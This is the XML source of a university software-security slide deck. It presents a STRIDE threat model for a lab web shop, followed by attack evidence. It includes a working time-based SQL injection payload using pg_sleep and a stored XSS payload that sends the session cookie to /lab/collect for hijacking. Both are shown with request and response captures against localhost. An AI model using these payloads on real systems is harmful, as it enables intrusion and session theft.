            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Modelo de Amenazas STRIDE</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>10 amenazas identificadas — todas las categorías cubiertas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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1371600"/>
            <a:ext cx="3565800" cy="2285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74C3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Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="1508760"/>
            <a:ext cx="548280" cy="548280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E74C3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" name="TextBox 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="155448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</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="150876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Spoofing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10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="1783080"/>
            <a:ext cx="2559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Suplantación de identidad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11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="2148840"/>
            <a:ext cx="3108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• S-01: Enumeración de usuarios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Box 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="2514600"/>
            <a:ext cx="3108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• S-02: JWT débil → forjar Admin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Rounded Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4297680" y="1371600"/>
            <a:ext cx="3565800" cy="2285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67E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Rectangle 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4434840" y="1508760"/>
            <a:ext cx="548280" cy="54828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TextBox 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4434840" y="155448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</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5120640" y="150876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Tampering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17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5120640" y="1783080"/>
            <a:ext cx="2559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Alteración de datos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18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="2148840"/>
            <a:ext cx="3108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• T-01: SQLi blind en búsqueda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19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="2514600"/>
            <a:ext cx="3108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• T-02: IDOR escritura en carrito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Rounded Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="1371600"/>
            <a:ext cx="3565800" cy="2285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39C1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" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8275320" y="1508760"/>
            <a:ext cx="548280" cy="548280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F39C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TextBox 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8275320" y="155448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</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8961120" y="150876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Repudiation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24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8961120" y="1783080"/>
            <a:ext cx="2559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Repudio de acciones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25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8412480" y="2148840"/>
            <a:ext cx="3108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• R-01: Sin tabla de auditoría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Rounded Rectangle 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3931920"/>
            <a:ext cx="3565800" cy="2285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980B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" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="4069080"/>
            <a:ext cx="548280" cy="548280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2980B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TextBox 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="411480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</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="406908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Info Disclosure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0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="4343400"/>
            <a:ext cx="2559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Divulgación de información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31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4709160"/>
            <a:ext cx="3108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• I-01: XSS + robo de cookie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32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="5074920"/>
            <a:ext cx="3108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• I-02: BOLA lectura de datos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33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="5440680"/>
            <a:ext cx="3108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• I-03: Enumeración login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Rounded Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4297680" y="3931920"/>
            <a:ext cx="3565800" cy="2285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E44A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" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4434840" y="4069080"/>
            <a:ext cx="548280" cy="548280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8E44A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8" name="TextBox 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4434840" y="411480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</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5120640" y="406908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Denial of Service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38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5120640" y="4343400"/>
            <a:ext cx="2559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Denegación de servicio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Box 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="4709160"/>
            <a:ext cx="3108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• D-01: Sin rate limit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Rounded Rectangle 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="3931920"/>
            <a:ext cx="3565800" cy="2285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0392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Rectangle 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8275320" y="4069080"/>
            <a:ext cx="548280" cy="548280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C039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42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8275320" y="4114800"/>
            <a:ext cx="548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</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8961120" y="406908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Elev. of Privilege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Box 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8961120" y="4343400"/>
            <a:ext cx="2559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Elevación de privilegios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Box 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8412480" y="4709160"/>
            <a:ext cx="3108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• E-01: Cookie/JWT → Admin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Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Ataque 1: SQL Injection Blind Time-Based</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>VULN-01 · CWE-89 · OWASP A03:2021 Injection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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1371600"/>
            <a:ext cx="5943240" cy="5028840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TextBox 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1463040"/>
            <a:ext cx="530316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📍 Endpoint afectado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GET /api/products/search?q=&lt;payload&gt;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🔬 Procedimiento del ataque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1. Enviar búsqueda normal → medir tiempo base (~0.005s)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2. Inyectar: q=no-match' OR (SELECT 1 FROM pg_sleep(2))=1 --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3. Medir tiempo de respuesta (~2.007s = +2.0s de retardo)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4. Confirmar con sqlmap: extraer nombre BD y tablas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📊 Resultados (DevTools Network)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Baseline:  4ms  →  Con pg_sleep(2):  2007ms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Diferencia: ~2003ms de retardo (inyección confirmada)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🛠️ Herramientas: DevTools Network + sqlmap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⚠️ Causa raíz: SQL raw con concatenación directa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del parámetro q usando rol minishop_search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Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="1371600"/>
            <a:ext cx="4845960" cy="1645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33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TextBox 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="141732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CVSS v3.1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Rounded Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="1737360"/>
            <a:ext cx="1096920" cy="822600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F39C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TextBox 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="1783080"/>
            <a:ext cx="1096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5.3</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="228600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MEDIUM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Box 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8321040" y="1783080"/>
            <a:ext cx="3200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AV:N / AC:L / PR:N / UI:N</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="1100"/>
            </a:b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S:U / C:L / I:N / A:N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1" name="Picture 14" descr="01-home-new.png"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="3200400"/>
            <a:ext cx="4845960" cy="2725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TextBox 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="5029200"/>
            <a:ext cx="4845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Página de búsqueda — punto de inyección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"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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4" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Evidencia SQLi: DevTools Network</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Comparación de tiempos — búsqueda normal vs inyección pg_sleep(2)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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8686800" y="384120"/>
            <a:ext cx="3200040" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF66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7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8686800" y="40248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⚠ PLACEHOLDER — Reemplazar con Burp Suite</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="128016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27AE60"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Petición Normal (baseline)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Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1645920"/>
            <a:ext cx="5486040" cy="2194200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="1737360"/>
            <a:ext cx="5211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50FA7B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>GET /api/products/search?q=teclado HTTP/1.1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Host: 127.0.0.1:5081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50FA7B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>HTTP/1.1 200 OK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Content-Type: application/json; charset=utf-8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Server: Kestrel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50FA7B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Status:    200 OK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8BE9FD"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Duration:  4ms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Type:      fetch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MimeType:  application/json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11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="128016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Petición Inyectada (pg_sleep(2))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Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="1645920"/>
            <a:ext cx="5486040" cy="2194200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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5" name="TextBox 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="1737360"/>
            <a:ext cx="521172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GET /api/products/search?q=no-match'+OR+(SELECT+1+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  FROM+pg_sleep(2))%3D1+-- HTTP/1.1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Host: 127.0.0.1:5081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1FA8C"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>HTTP/1.1 200 OK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Content-Type: application/json; charset=utf-8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Server: Kestrel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1FA8C"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Status:    200 OK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Duration:  2007ms  ← +2003ms de retardo!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Type:      fetch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Rounded Rectangle 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="540000" y="4114800"/>
            <a:ext cx="11246760" cy="1188360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDF5E6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="C0392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7" name="TextBox 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4206240"/>
            <a:ext cx="10515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📊 Análisis de Tiempos (equivalente a Burp Suite Repeater/Intruder)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Normal:    GET /api/products/search?q=teclado                    → 4ms     (HTTP 200)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Inyectada: GET /api/products/search?q=no-match'+OR+pg_sleep(2)   → 2007ms  (HTTP 200)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Δ Tiempo = 2003ms ≈ pg_sleep(2) — INYECCIÓN SQL CONFIRMADA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Box 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="548640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6600"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>⚠ Nota: Estas capturas DevTools serán reemplazadas por capturas de Burp Suite Repeater en la entrega final.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Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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1" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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Box 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Ataque 2: XSS Almacenado + Robo de Cookie</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>VULN-02 · CWE-79 · OWASP A03:2021 Injection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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1371600"/>
            <a:ext cx="7131960" cy="5028840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7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1463040"/>
            <a:ext cx="667476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📍 Endpoint afectado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POST /api/products/{id}/comments  +  GET /Products/Details/{id}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🔬 Cadena de ataque completa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Paso 1: Atacante (cliente-a) publica comentario malicioso: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&lt;img src=x onerror="fetch('/lab/collect?c='+...)"&gt;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Paso 2: El comentario se almacena sin sanitización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(@Html.Raw renderiza HTML crudo en modo Red Team)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Paso 3: Víctima (cliente-xss) visita /Products/Details/1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→ El JS inyectado ejecuta automáticamente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Paso 4: Cookie LabSession enviada a /lab/collect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→ GET /lab/collect?c=LabSession%3DCfDJ8... (HTTP 204)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Paso 5: Atacante replica cookie → suplanta sesión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→ GET /Account/Profile con cookie robada → ve 'cliente-xss'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⚠️ Causa raíz: @Html.Raw sin encoding + cookie sin HttpOnly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Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="1371600"/>
            <a:ext cx="3657240" cy="1645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33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7" name="TextBox 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="141732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CVSS v3.1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Rounded Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="1737360"/>
            <a:ext cx="1096920" cy="822600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F39C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9" name="TextBox 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="1783080"/>
            <a:ext cx="1096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6.8</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="228600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MEDIUM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13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9509760" y="1783080"/>
            <a:ext cx="2011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AV:N / AC:L / PR:L / UI:R</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="1100"/>
            </a:b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S:C / C:H / I:N / A:N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2" name="Picture 14" descr="05-product-detail-new.png"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="3200400"/>
            <a:ext cx="3657240" cy="2057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3" name="TextBox 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="50292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Detalle de producto con comentario XSS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Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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5" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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6" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Evidencia XSS: Cookie Theft via DevTools</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Petición /lab/collect capturada — cookie LabSession exfiltrada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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8686800" y="384120"/>
            <a:ext cx="3200040" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF66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Box 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8686800" y="40248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⚠ PLACEHOLDER — Reemplazar con Burp Suite</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="128016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Cookies del navegador (víctima cliente-xss) — HttpOnly=false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Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1645920"/>
            <a:ext cx="11246760" cy="1005480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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3" name="TextBox 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="1737360"/>
            <a:ext cx="109724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1FA8C"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>document.cookie = 'LabSession=CfDJ8Ae0AZXF1ABKv...zgHA'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→ Cookie accesible desde JavaScript (HttpOnly=false)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→ El script XSS la lee y la envía a /lab/collect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Box 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="283464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Petición de exfiltración capturada en Network (equiv. Burp HTTP History)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Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3200400"/>
            <a:ext cx="5486040" cy="2559960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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6" name="TextBox 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="3291840"/>
            <a:ext cx="521172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8BE9FD"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
